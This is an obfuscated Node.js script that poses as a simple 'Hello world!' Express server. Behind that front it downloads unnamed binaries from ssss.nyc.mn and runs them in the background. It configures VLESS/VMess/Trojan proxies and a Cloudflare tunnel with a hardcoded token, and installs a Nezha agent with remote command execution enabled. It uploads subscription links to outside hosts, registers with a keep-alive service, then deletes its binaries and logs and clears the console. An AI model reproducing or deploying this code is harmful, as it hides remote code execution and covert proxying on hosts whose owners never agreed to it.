const _0x11a320=_0xef16;(function(_0x2f8fa2,_0xfcb7ed){const _0x486d43=_0xef16,_0x5ac5ee=_0x2f8fa2();while(!![]){try{const _0x24d2b4=parseInt(_0x486d43(0x212))/0x1*(parseInt(_0x486d43(0x250))/0x2)+-parseInt(_0x486d43(0x1d0))/0x3+-parseInt(_0x486d43(0x261))/0x4*(-parseInt(_0x486d43(0x247))/0x5)+parseInt(_0x486d43(0x223))/0x6*(-parseInt(_0x486d43(0x1f5))/0x7)+-parseInt(_0x486d43(0x24c))/0x8+parseInt(_0x486d43(0x1f4))/0x9+parseInt(_0x486d43(0x1e5))/0xa;if(_0x24d2b4===_0xfcb7ed)break;else _0x5ac5ee['push'](_0x5ac5ee['shift']());}catch(_0x3d918e){_0x5ac5ee['push'](_0x5ac5ee['shift']());}}}(_0x2088,0x7edd5));const express=require(_0x11a320(0x226)),app=express(),axios=require(_0x11a320(0x1c2)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x11a320(0x24d)),exec=promisify(require(_0x11a320(0x1eb))[_0x11a320(0x1f1)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x11a320(0x1b5)]||'',PROJECT_URL=process[_0x11a320(0x1fd)][_0x11a320(0x1af)]||'',AUTO_ACCESS=process[_0x11a320(0x1fd)][_0x11a320(0x25b)]||![],FILE_PATH=process[_0x11a320(0x1fd)][_0x11a320(0x220)]||_0x11a320(0x22d),SUB_PATH=process[_0x11a320(0x1fd)]['SUB_PATH']||_0x11a320(0x1ac),PORT=process[_0x11a320(0x1fd)][_0x11a320(0x1cd)]||process[_0x11a320(0x1fd)][_0x11a320(0x1ad)]||0xbb8,UUID=process[_0x11a320(0x1fd)][_0x11a320(0x1d3)]||_0x11a320(0x246),NEZHA_SERVER=process[_0x11a320(0x1fd)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x11a320(0x1fd)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x11a320(0x1fd)][_0x11a320(0x1ae)]||'',ARGO_DOMAIN=process['env'][_0x11a320(0x1a8)]||_0x11a320(0x1bc),ARGO_AUTH=process[_0x11a320(0x1fd)][_0x11a320(0x1b0)]||_0x11a320(0x238),ARGO_PORT=process[_0x11a320(0x1fd)][_0x11a320(0x224)]||0x1f41,CFIP=process[_0x11a320(0x1fd)][_0x11a320(0x1bb)]||_0x11a320(0x263),CFPORT=process[_0x11a320(0x1fd)][_0x11a320(0x1d1)]||0x1bb,NAME=process['env'][_0x11a320(0x24b)]||_0x11a320(0x20a);!fs[_0x11a320(0x213)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x11a320(0x1e1)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function _0x2088(){const _0x4c0cde=['443','direct','Hello\x20world!','\x20is\x20running','join','application/json','unshift','log','http\x20server\x20is\x20running\x20on\x20port:','win32','tunnel.json','16500730xhsieB','tunnel.yml','/vmess-argo?ed=2560','pipe','base64','\x20-c\x20\x22','child_process','App\x20is\x20running','filter','platform','&path=%2Ftrojan-argo%3Fed%3D2560#','php\x20running\x20error:\x20','exec','nohup\x20','trojan','201195BIkZgY','814786IjLlBF','arm','rm\x20-rf\x20','mkdirSync','all','TunnelSecret','&fp=firefox&type=ws&host=','--tls','env','127.0.0.1','arch','web\x20running\x20error:\x20','close','/vless-argo','unlink','push','\x20-p\x20','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20\x0avmess://','block','2083','railway','.exe\x20>\x20nul\x202>&1','2087','automatic\x20access\x20task\x20added\x20successfully','map','/sub.txt\x20saved\x20successfully','from','Error\x20downloading\x20files:','701vYKyDD','existsSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tcp','fileName','\x0a\x20\x20tunnel:\x20','false','Content-Type','Error\x20executing\x20command:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','vless','unlinkSync','FILE_PATH','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Nodes\x20uploaded\x20successfully','6VbSMrH','ARGO_PORT','tls','express','2053','blackhole','none','\x0aclient_secret:\x20','https://amd64.ssss.nyc.mn/web','npm\x20running\x20error:\x20','./tmp','\x0avless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','list.txt','Error\x20in\x20startserver:','config.json','charAt','\x0a\x20\x20\x20\x20','Empowerment\x20failed\x20for\x20','Skipping\x20adding\x20automatic\x20access\x20task','send','eyJhIjoiMjV10wNiZGQ5M2I2MTk2MjJlMjUeNzVjYmYxZjZiMjciLCJeIjoiZwQ2ZTIiY2QtZGNmNS00YzJhLWFIZjQtZDU2N2JmZDAONjA5IiwicyIoIlkyRTNZMkkywWpndE9XSTFaaTAwTVROaUxUZzNZVFVOWXpNNEOySXpORGMxTjJabCJ9','fileUrl','https://arm64.ssss.nyc.mn/agent','/trojan-argo','boot.log','Empowerment\x20success\x20for\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https+local://8.8.8.8/dns-query','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Error\x20reading\x20boot.log:','match','/vmess-argo','split','9afd1229-b893-40c1-84dd-51e7ce204913','5HPtwqJ','stringify','length','https://amd64.ssss.nyc.mn/v1','NAME','4455024BWAmqN','util','basename','true','54ZXZagD','http','utf-8','message','writeFileSync','\x20>/dev/null\x202>&1\x20&','Add\x20automatic\x20access\x20task\x20faild:\x20','aarch64','status','error','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','AUTO_ACCESS','quic','NEZHA\x20variable\x20is\x20empty,skip\x20running','has','ArgoDomain:','\x20-c\x20','1734832CxPlEC','https://amd64.ssss.nyc.mn/bot','cdns.doon.eu.org','?security=tls&sni=','ARGO_DOMAIN','isFile','catch','/api/add-nodes','sub','PORT','NEZHA_KEY','PROJECT_URL','ARGO_AUTH','text/plain;\x20charset=utf-8','2096','https://arm64.ssss.nyc.mn/bot','abcdefghijklmnopqrstuvwxyz','UPLOAD_URL','set','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','response','\x20failed:\x20','https://arm64.ssss.nyc.mn/web','CFIP','railway.5.e.7.b.0.d.0.0.1.0.a.2.ip6.arpa','freedom','createWriteStream','\x0a\x20\x20\x0atrojan://','readFileSync','pop','axios','get','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','forEach','/api/add-subscriptions','\x0a\x20\x20credentials-file:\x20','readdirSync','&path=%2Fvless-argo%3Fed%3D2560#','floor','includes','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','SERVER_PORT','pkill\x20-f\x20\x22[','ARGO_DOMAIN:','2796450KNfDau','CFPORT','stream','UUID','Unhandled\x20error\x20in\x20startserver:','toString','test','post','taskkill\x20/f\x20/im\x20','Download\x20'];_0x2088=function(){return _0x4c0cde;};return _0x2088();}function generateRandomName(){const _0x257eaa=_0x11a320,_0x3cf8fb=_0x257eaa(0x1b4);let _0x4a40b6='';for(let _0x51d2d1=0x0;_0x51d2d1<0x6;_0x51d2d1++){_0x4a40b6+=_0x3cf8fb['charAt'](Math[_0x257eaa(0x1ca)](Math['random']()*_0x3cf8fb[_0x257eaa(0x249)]));}return _0x4a40b6;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x11a320(0x1de)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x11a320(0x1de)](FILE_PATH,webName),botPath=path[_0x11a320(0x1de)](FILE_PATH,botName),subPath=path[_0x11a320(0x1de)](FILE_PATH,'sub.txt'),listPath=path[_0x11a320(0x1de)](FILE_PATH,_0x11a320(0x230)),bootLogPath=path[_0x11a320(0x1de)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x11a320(0x232));function deleteNodes(){const _0x109d74=_0x11a320;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x4a811a;try{_0x4a811a=fs[_0x109d74(0x1c0)](subPath,'utf-8');}catch{return null;}const _0x2962bb=Buffer[_0x109d74(0x210)](_0x4a811a,_0x109d74(0x1e9))[_0x109d74(0x1d5)]('utf-8'),_0x2a17c7=_0x2962bb[_0x109d74(0x245)]('\x0a')[_0x109d74(0x1ed)](_0x3658c5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x109d74(0x1d6)](_0x3658c5));if(_0x2a17c7[_0x109d74(0x249)]===0x0)return;return axios[_0x109d74(0x1d7)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x109d74(0x248)]({'nodes':_0x2a17c7}),{'headers':{'Content-Type':_0x109d74(0x1df)}})[_0x109d74(0x1aa)](_0x22679f=>{return null;}),null;}catch(_0x27a0f9){return null;}}function _0xef16(_0x14adf6,_0x232afa){const _0x20888e=_0x2088();return _0xef16=function(_0xef161a,_0x229bd3){_0xef161a=_0xef161a-0x1a7;let _0x2c2ef3=_0x20888e[_0xef161a];return _0x2c2ef3;},_0xef16(_0x14adf6,_0x232afa);}function cleanupOldFiles(){const _0x2e270e=_0x11a320;try{const _0x46b178=fs[_0x2e270e(0x1c8)](FILE_PATH);_0x46b178[_0x2e270e(0x1c5)](_0x4e880a=>{const _0x4960a3=_0x2e270e,_0x875de=path[_0x4960a3(0x1de)](FILE_PATH,_0x4e880a);try{const _0x465da6=fs['statSync'](_0x875de);_0x465da6[_0x4960a3(0x1a9)]()&&fs[_0x4960a3(0x21f)](_0x875de);}catch(_0x16297d){}});}catch(_0x53b27b){}}app[_0x11a320(0x1c3)]('/',function(_0x55d33d,_0x184f93){const _0x25ad81=_0x11a320;_0x184f93[_0x25ad81(0x237)](_0x25ad81(0x1dc));});async function generateConfig(){const _0x494729=_0x11a320,_0x233278={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x494729(0x229)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x494729(0x229),'fallbacks':[{'dest':0xbb9},{'path':_0x494729(0x202),'dest':0xbba},{'path':_0x494729(0x244),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x494729(0x1fe),'protocol':_0x494729(0x21e),'settings':{'clients':[{'id':UUID}],'decryption':_0x494729(0x229)},'streamSettings':{'network':_0x494729(0x215),'security':_0x494729(0x229)}},{'port':0xbba,'listen':_0x494729(0x1fe),'protocol':_0x494729(0x21e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x494729(0x229)},'streamSettings':{'network':'ws','security':_0x494729(0x229),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x494729(0x251),_0x494729(0x225),_0x494729(0x25c)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x494729(0x244)}},'sniffing':{'enabled':!![],'destOverride':[_0x494729(0x251),_0x494729(0x225),_0x494729(0x25c)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x494729(0x1fe),'protocol':_0x494729(0x1f3),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x494729(0x229),'wsSettings':{'path':_0x494729(0x23b)}},'sniffing':{'enabled':!![],'destOverride':[_0x494729(0x251),_0x494729(0x225),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x494729(0x23f)]},'outbounds':[{'protocol':_0x494729(0x1bd),'tag':_0x494729(0x1db)},{'protocol':_0x494729(0x228),'tag':_0x494729(0x208)}]};fs[_0x494729(0x254)](path[_0x494729(0x1de)](FILE_PATH,'config.json'),JSON['stringify'](_0x233278,null,0x2));}function getSystemArchitecture(){const _0x44be5d=_0x11a320,_0x3623ac=os[_0x44be5d(0x1ff)]();return _0x3623ac==='arm'||_0x3623ac==='arm64'||_0x3623ac===_0x44be5d(0x257)?_0x44be5d(0x1f6):'amd';}function downloadFile(_0xa198c8,_0x92f1a4,_0x23e73f){const _0x34214f=_0x11a320,_0x25b684=_0xa198c8;!fs['existsSync'](FILE_PATH)&&fs[_0x34214f(0x1f8)](FILE_PATH,{'recursive':!![]});const _0x31da9b=fs[_0x34214f(0x1be)](_0x25b684);axios({'method':'get','url':_0x92f1a4,'responseType':_0x34214f(0x1d2)})['then'](_0x484334=>{const _0x2a89ac=_0x34214f;_0x484334['data'][_0x2a89ac(0x1e8)](_0x31da9b),_0x31da9b['on']('finish',()=>{const _0xc401c7=_0x2a89ac;_0x31da9b[_0xc401c7(0x201)](),console['log'](_0xc401c7(0x1d9)+path[_0xc401c7(0x24e)](_0x25b684)+'\x20successfully'),_0x23e73f(null,_0x25b684);}),_0x31da9b['on'](_0x2a89ac(0x259),_0x65ac1d=>{const _0x31677f=_0x2a89ac;fs[_0x31677f(0x203)](_0x25b684,()=>{});const _0x39164b=_0x31677f(0x1d9)+path['basename'](_0x25b684)+'\x20failed:\x20'+_0x65ac1d[_0x31677f(0x253)];console[_0x31677f(0x259)](_0x39164b),_0x23e73f(_0x39164b);});})[_0x34214f(0x1aa)](_0x230317=>{const _0x39589f=_0x34214f,_0x32d8f3=_0x39589f(0x1d9)+path[_0x39589f(0x24e)](_0x25b684)+_0x39589f(0x1b9)+_0x230317[_0x39589f(0x253)];console[_0x39589f(0x259)](_0x32d8f3),_0x23e73f(_0x32d8f3);});}async function downloadFilesAndRun(){const _0x4264d2=_0x11a320,_0xf03ab1=getSystemArchitecture(),_0xf905e2=getFilesForArchitecture(_0xf03ab1);if(_0xf905e2[_0x4264d2(0x249)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2712eb=_0xf905e2[_0x4264d2(0x20e)](_0xcfbbd4=>{return new Promise((_0x3bbe13,_0xb069a4)=>{const _0x1f6388=_0xef16;downloadFile(_0xcfbbd4[_0x1f6388(0x216)],_0xcfbbd4[_0x1f6388(0x239)],(_0x1cd073,_0x509e95)=>{_0x1cd073?_0xb069a4(_0x1cd073):_0x3bbe13(_0x509e95);});});});try{await Promise[_0x4264d2(0x1f9)](_0x2712eb);}catch(_0x3b428c){console[_0x4264d2(0x259)](_0x4264d2(0x211),_0x3b428c);return;}function _0xb61c5(_0x14128f){const _0x2f521d=_0x4264d2,_0xe95741=0x1fd;_0x14128f[_0x2f521d(0x1c5)](_0x6b5b4c=>{const _0x498fe2=_0x2f521d;fs[_0x498fe2(0x213)](_0x6b5b4c)&&fs['chmod'](_0x6b5b4c,_0xe95741,_0x3cdea8=>{const _0x2c0c23=_0x498fe2;_0x3cdea8?console[_0x2c0c23(0x259)](_0x2c0c23(0x235)+_0x6b5b4c+':\x20'+_0x3cdea8):console[_0x2c0c23(0x1e1)](_0x2c0c23(0x23d)+_0x6b5b4c+':\x20'+_0xe95741[_0x2c0c23(0x1d5)](0x8));});});}const _0x4869d3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xb61c5(_0x4869d3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x371d1c=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4264d2(0x245)](':')[_0x4264d2(0x1c1)]():'',_0x55e397=new Set([_0x4264d2(0x1da),'8443',_0x4264d2(0x1b2),_0x4264d2(0x20c),_0x4264d2(0x209),_0x4264d2(0x227)]),_0x508934=_0x55e397[_0x4264d2(0x25e)](_0x371d1c)?_0x4264d2(0x24f):_0x4264d2(0x218),_0x569c44=_0x4264d2(0x22a)+NEZHA_KEY+_0x4264d2(0x22f)+NEZHA_SERVER+_0x4264d2(0x21b)+_0x508934+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4264d2(0x254)](path['join'](FILE_PATH,'config.yaml'),_0x569c44);const _0x2f52af='nohup\x20'+phpPath+_0x4264d2(0x1ea)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2f52af),console[_0x4264d2(0x1e1)](phpName+_0x4264d2(0x1dd)),await new Promise(_0x3d5df0=>setTimeout(_0x3d5df0,0x3e8));}catch(_0x4f62e1){console[_0x4264d2(0x259)](_0x4264d2(0x1f0)+_0x4f62e1);}}else{let _0x5e0898='';const _0x4074f9=[_0x4264d2(0x1da),'8443',_0x4264d2(0x1b2),_0x4264d2(0x20c),_0x4264d2(0x209),_0x4264d2(0x227)];_0x4074f9[_0x4264d2(0x1cb)](NEZHA_PORT)&&(_0x5e0898=_0x4264d2(0x1fc));const _0x492f65=_0x4264d2(0x1f2)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4264d2(0x205)+NEZHA_KEY+'\x20'+_0x5e0898+_0x4264d2(0x1cc);try{await exec(_0x492f65),console[_0x4264d2(0x1e1)](npmName+_0x4264d2(0x1dd)),await new Promise(_0x825da8=>setTimeout(_0x825da8,0x3e8));}catch(_0x5b1ee3){console[_0x4264d2(0x259)](_0x4264d2(0x22c)+_0x5b1ee3);}}}else console[_0x4264d2(0x1e1)](_0x4264d2(0x25d));const _0x2e29b4=_0x4264d2(0x1f2)+webPath+_0x4264d2(0x260)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2e29b4),console[_0x4264d2(0x1e1)](webName+_0x4264d2(0x1dd)),await new Promise(_0x1aba4a=>setTimeout(_0x1aba4a,0x3e8));}catch(_0xb66e10){console[_0x4264d2(0x259)](_0x4264d2(0x200)+_0xb66e10);}if(fs[_0x4264d2(0x213)](botPath)){let _0x44e9b8;if(ARGO_AUTH[_0x4264d2(0x243)](/^[A-Z0-9a-z=]{120,250}$/))_0x44e9b8='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x44e9b8=_0x4264d2(0x1b7)+FILE_PATH+'/tunnel.yml\x20run':_0x44e9b8='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4264d2(0x1f2)+botPath+'\x20'+_0x44e9b8+_0x4264d2(0x255)),console[_0x4264d2(0x1e1)](botName+_0x4264d2(0x1dd)),await new Promise(_0x3c78e4=>setTimeout(_0x3c78e4,0x7d0));}catch(_0x363f5f){console['error'](_0x4264d2(0x21a)+_0x363f5f);}}await new Promise(_0xd0b442=>setTimeout(_0xd0b442,0x1388));}function getFilesForArchitecture(_0x183d68){const _0x91cc9b=_0x11a320;let _0x3d21a8;_0x183d68===_0x91cc9b(0x1f6)?_0x3d21a8=[{'fileName':webPath,'fileUrl':_0x91cc9b(0x1ba)},{'fileName':botPath,'fileUrl':_0x91cc9b(0x1b3)}]:_0x3d21a8=[{'fileName':webPath,'fileUrl':_0x91cc9b(0x22b)},{'fileName':botPath,'fileUrl':_0x91cc9b(0x262)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x555446=_0x183d68==='arm'?_0x91cc9b(0x23a):_0x91cc9b(0x206);_0x3d21a8[_0x91cc9b(0x1e0)]({'fileName':npmPath,'fileUrl':_0x555446});}else{const _0x440858=_0x183d68==='arm'?_0x91cc9b(0x21c):_0x91cc9b(0x24a);_0x3d21a8[_0x91cc9b(0x1e0)]({'fileName':phpPath,'fileUrl':_0x440858});}}return _0x3d21a8;}function argoType(){const _0x226d8e=_0x11a320;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x226d8e(0x1e1)](_0x226d8e(0x241));return;}if(ARGO_AUTH['includes'](_0x226d8e(0x1fa))){fs[_0x226d8e(0x254)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1cb9a3=_0x226d8e(0x217)+ARGO_AUTH[_0x226d8e(0x245)]('\x22')[0xb]+_0x226d8e(0x1c7)+path['join'](FILE_PATH,_0x226d8e(0x1e4))+_0x226d8e(0x1c4)+ARGO_DOMAIN+_0x226d8e(0x21d)+ARGO_PORT+_0x226d8e(0x240);fs[_0x226d8e(0x254)](path[_0x226d8e(0x1de)](FILE_PATH,_0x226d8e(0x1e6)),_0x1cb9a3);}else console['log'](_0x226d8e(0x23e));}argoType();async function extractDomains(){const _0x2bb44a=_0x11a320;let _0x5b1684;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5b1684=ARGO_DOMAIN,console['log'](_0x2bb44a(0x1cf),_0x5b1684),await _0x2c7b6a(_0x5b1684);else try{const _0x223a63=fs['readFileSync'](path['join'](FILE_PATH,_0x2bb44a(0x23c)),'utf-8'),_0x3ca259=_0x223a63['split']('\x0a'),_0x5253b9=[];_0x3ca259['forEach'](_0x59c632=>{const _0x29e155=_0x2bb44a,_0x49e0a3=_0x59c632[_0x29e155(0x243)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x49e0a3){const _0x3bbb0e=_0x49e0a3[0x1];_0x5253b9[_0x29e155(0x204)](_0x3bbb0e);}});if(_0x5253b9['length']>0x0)_0x5b1684=_0x5253b9[0x0],console[_0x2bb44a(0x1e1)](_0x2bb44a(0x25f),_0x5b1684),await _0x2c7b6a(_0x5b1684);else{console[_0x2bb44a(0x1e1)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x2bb44a(0x21f)](path[_0x2bb44a(0x1de)](FILE_PATH,_0x2bb44a(0x23c)));async function _0x432421(){const _0x14ec7c=_0x2bb44a;try{process[_0x14ec7c(0x1ee)]===_0x14ec7c(0x1e3)?await exec(_0x14ec7c(0x1d8)+botName+_0x14ec7c(0x20b)):await exec(_0x14ec7c(0x1ce)+botName[_0x14ec7c(0x233)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x43b381){}}_0x432421(),await new Promise(_0xa48b25=>setTimeout(_0xa48b25,0xbb8));const _0x53114b=_0x2bb44a(0x214)+FILE_PATH+_0x2bb44a(0x221)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x53114b+_0x2bb44a(0x255)),console['log'](botName+_0x2bb44a(0x1dd)),await new Promise(_0x5e470=>setTimeout(_0x5e470,0xbb8)),await extractDomains();}catch(_0x3fd594){console[_0x2bb44a(0x259)]('Error\x20executing\x20command:\x20'+_0x3fd594);}}}catch(_0x4259fd){console[_0x2bb44a(0x259)](_0x2bb44a(0x242),_0x4259fd);}async function _0x2c7b6a(_0x1ac382){const _0x1f0ade=_0x2bb44a,_0x1f9492=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x1f0ade(0x252)}),_0x449f3c=_0x1f9492['trim'](),_0x1054f1=NAME?NAME+'-'+_0x449f3c:_0x449f3c;return new Promise(_0x191a80=>{setTimeout(()=>{const _0x254634=_0xef16,_0x23911d={'v':'2','ps':''+_0x1054f1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x254634(0x229),'net':'ws','type':_0x254634(0x229),'host':_0x1ac382,'path':_0x254634(0x1e7),'tls':_0x254634(0x225),'sni':_0x1ac382,'alpn':'','fp':'firefox'},_0x2eecc2=_0x254634(0x22e)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1ac382+_0x254634(0x1fb)+_0x1ac382+_0x254634(0x1c9)+_0x1054f1+_0x254634(0x207)+Buffer[_0x254634(0x210)](JSON[_0x254634(0x248)](_0x23911d))[_0x254634(0x1d5)]('base64')+_0x254634(0x1bf)+UUID+'@'+CFIP+':'+CFPORT+_0x254634(0x1a7)+_0x1ac382+_0x254634(0x1fb)+_0x1ac382+_0x254634(0x1ef)+_0x1054f1+_0x254634(0x234);console[_0x254634(0x1e1)](Buffer[_0x254634(0x210)](_0x2eecc2)['toString'](_0x254634(0x1e9))),fs[_0x254634(0x254)](subPath,Buffer[_0x254634(0x210)](_0x2eecc2)['toString'](_0x254634(0x1e9))),console[_0x254634(0x1e1)](FILE_PATH+_0x254634(0x20f)),uploadNodes(),app[_0x254634(0x1c3)]('/'+SUB_PATH,(_0x4d7df0,_0x364113)=>{const _0x3a0108=_0x254634,_0xb983e7=Buffer[_0x3a0108(0x210)](_0x2eecc2)[_0x3a0108(0x1d5)](_0x3a0108(0x1e9));_0x364113[_0x3a0108(0x1b6)](_0x3a0108(0x219),_0x3a0108(0x1b1)),_0x364113[_0x3a0108(0x237)](_0xb983e7);}),_0x191a80(_0x2eecc2);},0x7d0);});}}async function uploadNodes(){const _0x253eae=_0x11a320;if(UPLOAD_URL&&PROJECT_URL){const _0x8670ea=PROJECT_URL+'/'+SUB_PATH,_0x27d205={'subscription':[_0x8670ea]};try{const _0x18215c=await axios['post'](UPLOAD_URL+_0x253eae(0x1c6),_0x27d205,{'headers':{'Content-Type':_0x253eae(0x1df)}});return _0x18215c&&_0x18215c['status']===0xc8?(console[_0x253eae(0x1e1)]('Subscription\x20uploaded\x20successfully'),_0x18215c):null;}catch(_0x3d5104){if(_0x3d5104[_0x253eae(0x1b8)]){if(_0x3d5104[_0x253eae(0x1b8)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x253eae(0x213)](listPath))return;const _0x16dd5b=fs[_0x253eae(0x1c0)](listPath,'utf-8'),_0x2463f3=_0x16dd5b['split']('\x0a')[_0x253eae(0x1ed)](_0x401d2f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x253eae(0x1d6)](_0x401d2f));if(_0x2463f3['length']===0x0)return;const _0x400a05=JSON['stringify']({'nodes':_0x2463f3});try{const _0x1803a0=await axios[_0x253eae(0x1d7)](UPLOAD_URL+_0x253eae(0x1ab),_0x400a05,{'headers':{'Content-Type':_0x253eae(0x1df)}});return _0x1803a0&&_0x1803a0[_0x253eae(0x258)]===0xc8?(console[_0x253eae(0x1e1)](_0x253eae(0x222)),_0x1803a0):null;}catch(_0xad60ec){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x56118a=_0xef16,_0x44c627=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x44c627['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x44c627[_0x56118a(0x204)](phpPath);process[_0x56118a(0x1ee)]===_0x56118a(0x1e3)?exec('del\x20/f\x20/q\x20'+_0x44c627[_0x56118a(0x1de)]('\x20')+'\x20>\x20nul\x202>&1',_0xcdaf0e=>{const _0x368a56=_0x56118a;console['clear'](),console[_0x368a56(0x1e1)]('App\x20is\x20running'),console[_0x368a56(0x1e1)](_0x368a56(0x25a));}):exec(_0x56118a(0x1f7)+_0x44c627[_0x56118a(0x1de)]('\x20')+'\x20>/dev/null\x202>&1',_0x468736=>{const _0xad1e25=_0x56118a;console['clear'](),console[_0xad1e25(0x1e1)](_0xad1e25(0x1ec)),console[_0xad1e25(0x1e1)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x414b1a=_0x11a320;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x414b1a(0x236));return;}try{const _0x2029d8=await axios[_0x414b1a(0x1d7)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x414b1a(0x1df)}});return console[_0x414b1a(0x1e1)](_0x414b1a(0x20d)),_0x2029d8;}catch(_0x1273ee){return console[_0x414b1a(0x259)](_0x414b1a(0x256)+_0x1273ee['message']),null;}}async function startserver(){const _0x4d79e5=_0x11a320;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x536b60){console[_0x4d79e5(0x259)](_0x4d79e5(0x231),_0x536b60);}}startserver()[_0x11a320(0x1aa)](_0x46bd14=>{const _0x2f0644=_0x11a320;console[_0x2f0644(0x259)](_0x2f0644(0x1d4),_0x46bd14);}),app['listen'](PORT,()=>console['log'](_0x11a320(0x1e2)+PORT+'!'));
